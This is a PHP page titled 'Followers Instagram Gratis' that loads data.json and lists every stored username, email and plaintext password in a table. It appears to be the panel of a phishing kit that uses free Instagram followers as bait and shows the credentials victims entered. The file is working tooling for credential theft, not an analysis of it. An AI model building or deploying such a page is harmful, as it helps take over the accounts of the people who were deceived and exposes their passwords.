<?php 

$data = file_get_contents("data.json");
$data = json_decode($data);

foreach ($data as $d) {

}

    /* foreach ($data as $d) {
	echo "username : ".$d->username."<br>";
	echo "email : ".$d->email."<br>";
	echo "paasword : ".$d->password."<br>";
} */

?>

<!DOCTYPE html>
<html>

<meta charset="UTF-8">
<meta name="viewport" content="width-device-width, initial-scale=1.0">

<head>
	<title>Followers Instagram Gratis</title>

	<style>

	     @import url('https://fonts.googleapis.com/css2?family=Archivo+Narrow:ital@1&display=swap');

	     @media(max-width: 768px) {

	    }
		
		html {
			background-color: white;
			font-family: 'Archivo Narrow', sans-serif;
			font-size: 20px;
			color: gray;
		}

		th {
			background-color: orange;
			color: white;
		}

		td {
			background-color: #efffff;
		}

		table {
			box-shadow: 2px 10px 10px lightgray;
		}

	</style>
</head>
<body>

<center><table border="0" cellpadding="20" cellspacing="0">
	<tr>
		<th>Username</th>
		<th>Email</th>
		<th>Password</th>
	</tr>

	<tr>
		<td><?php foreach ($data as $d) {
	echo "- ".$d->username."<br>"; } ?></td>
		<td><?php foreach ($data as $d) {
	echo "- ".$d->email." <br>"; } ?></td>
		<td><?php foreach ($data as $d) {
	echo "- ".$d->password." <br>"; } ?></td>
	</tr>

	<tr>
		<th>Username</th>
		<th>Email</th>
		<th>Password</th>
	</tr>
</table></center>

</body>
</html>